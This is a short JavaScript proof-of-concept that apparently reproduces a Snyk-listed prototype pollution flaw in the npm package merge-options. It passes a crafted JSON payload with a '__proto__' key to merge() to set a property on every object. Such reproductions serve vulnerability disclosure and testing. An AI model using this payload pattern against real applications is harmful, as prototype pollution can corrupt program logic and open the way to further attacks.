//https://snyk.io/vuln/npm:merge-options:20180415
 
  const merge = require("merge-options");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

   

  merge({}, JSON.parse(malicious_payload));
// End of file
